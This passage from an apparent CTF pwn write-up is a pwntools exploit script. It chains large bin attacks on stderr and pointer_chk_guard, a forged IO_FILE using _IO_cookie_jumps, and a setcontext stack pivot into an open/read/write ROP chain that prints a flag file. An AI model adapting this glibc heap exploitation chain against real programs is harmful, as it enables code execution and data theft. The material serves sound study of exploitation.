   open_addr = libc.sym['open']+libc_base
   read_addr = libc.sym['read']+libc_base
   write_addr = libc.sym['write']+libc_base
   
   pop_rdi_ret=libc_base + 0x000000000002858f
   pop_rdx_r12_ret=libc_base + 0x0000000000114161
   pop_rax_ret=libc_base + 0x0000000000045580
   pop_rsi_ret=libc_base + 0x000000000002ac3f
   ret= libc_base + 0x0000000000026699
   
   # 泄漏堆地址 同时完成large bin attack 攻击 覆盖掉IO_list_all
   free(0)
   edit(1,p64(addr)*2 + p64(0) + p64(stderr_addr-0x20))
   add(0x4b0,15)    #15 将chunk0放入large bin 触发large bin attack
   show(1)
   run()
   p.recvuntil(b'Malloc Done\n')
   heap_addr = u64(p.recv(6).ljust(8,b'\x00'))-0x2760
   success("heap_addr==>"+hex(heap_addr))
   
   # ========== 修改 top_chunk ==========
   add(0x4c0,15)   # 用来修改 top_chunk的size
   free(15)        # 提高 top_chunk 
   add(0x4b0,14)
   edit(15,b"\x00"*0x4b8 + p64(0x700))
   run()
   
   # ========== large bin attack 覆盖 pointer_chk_guard==========
   free(2)
   pointer_chk_guard_addr = libc_base - 0x2890
   success("pointer_chk_guard_addr ==>" + hex(pointer_chk_guard_addr))
   edit(1,p64(addr)*3 + p64(pointer_chk_guard_addr-0x20))
   add(0x4b0,15)    #15 将chunk0放入large bin 触发large bin attack
   run()
   xor_key = heap_addr + 0x3A20
   success("xor_key ==>" + hex(xor_key))
   
   # ORW
   syscall = read_addr+16
   flag = heap_addr+0x2C00
   
   # open(0,flag)
   orw =p64(pop_rdi_ret)+p64(flag)
   orw+=p64(pop_rsi_ret)+p64(0)
   orw+=p64(pop_rax_ret)+p64(2)
   orw+=p64(syscall)
   # orw =p64(pop_rdi_ret)+p64(flag)
   # orw+=p64(pop_rsi_ret)+p64(0)
   # orw+=p64(open_addr)
   
   # read(3,heap+0x1010,0x30) 
   orw+=p64(pop_rdi_ret)+p64(3)
   orw+=p64(pop_rsi_ret)+p64(heap_addr+0x1010)     # 从地址 读出flag
   orw+=p64(pop_rdx_r12_ret)+p64(0x30)+p64(0)
   orw+=p64(read_addr)     
   
   # write(1,heap+0x1010,0x30)
   orw+=p64(pop_rdi_ret)+p64(1)
   orw+=p64(pop_rsi_ret)+p64(heap_addr+0x1010)     # 从地址 读出flag
   orw+=p64(pop_rdx_r12_ret)+p64(0x30)+p64(0)
   orw+=p64(write_addr)
   
   # ========== 伪造IO_FILE 1 ==========
   chunk1_addr = heap_addr + 0x2760         #当前large bin 的地址 ==> 伪造IO_FILE的堆地址
   
   file  = p64(0) + p64(0)                  #_IO_read_end    _IO_read_base
   file += p64(0) + p64(0) + p64(0)         #_IO_write_base  _IO_write_ptr _IO_write_end
   file += p64(0) + p64(0)                  #_IO_buf_base    _IO_buf_end
   file += p64(0) * 8                       #_IO_save_base ~ _codecvt
   file += p64(heap_addr) + p64(0)*2        #_lock   _offset  _codecvt
   file += p64(0)                           #_wide_data
   file += p64(0) *3                        #_freeres_list ~ __pad5
   file += p64(0) + p64(0)*2                #_mode  _unused2 (2dword)
   
   file +=p64(_IO_cookie_jumps_addr + 0x38) #vtable
   
   rdi_data     = chunk1_addr + 0xf0
   rdx_data     = chunk1_addr + 0xf0
   stack_change = chunk1_addr + 0x1c0
   
   gadget = 0x000000000014b760 + libc_base
   encrypt_gadget = rotate_left_64(gadget^xor_key,0x11)
   # ========== cookie ==========
   file += p64(rdi_data)                    #__cookie
   file += p64(encrypt_gadget)              #__io_functions.read
   file += p64(0) + p64(rdx_data)           #_IO_write_base _IO_write_ptr
   file += p64(0)*2 + p64(setcontext_addr)  #gadget中call setcontext_addr
   
   file += p64(0) * 15 + p64(stack_change) + p64(ret) #setcontext+61传参
   file += p64(0) * 4
   
   # stack change addr
   file += orw
   debug()
   edit(0,file)
   add(0x4b0,15)   # 触发 __malloc_assert
   run()
   p.interactive()
   ```